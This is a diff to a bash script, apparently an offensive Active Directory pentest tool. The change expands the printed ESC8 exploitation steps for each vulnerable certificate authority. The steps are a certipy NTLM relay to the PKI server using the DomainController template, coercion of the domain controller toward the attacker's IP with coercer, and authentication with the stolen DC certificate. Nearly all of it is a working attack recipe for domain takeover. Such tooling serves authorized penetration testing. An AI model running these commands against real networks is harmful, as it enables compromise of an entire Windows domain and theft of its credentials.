@@ -1786,9 +1786,11 @@ adcs_vuln_parse() {
         for vulnca in $esc8_vuln; do
             echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
-            echo -e "${certipy} relay -target http://${dc_ip}"
+            echo -e "${certipy} relay -target http://< ${pki_servers} > -ca ${vulnca} -template DomainController "
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l $attacker_IP --dc-ip ${dc_ip}"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l < attacker_IP $attacker_IP > --dc-ip ${dc_ip}"
+            echo -e "${CYAN}3. Authenticate using pfx of Domain Controller:${NC}"
+            echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip}"
         done
     fi
 
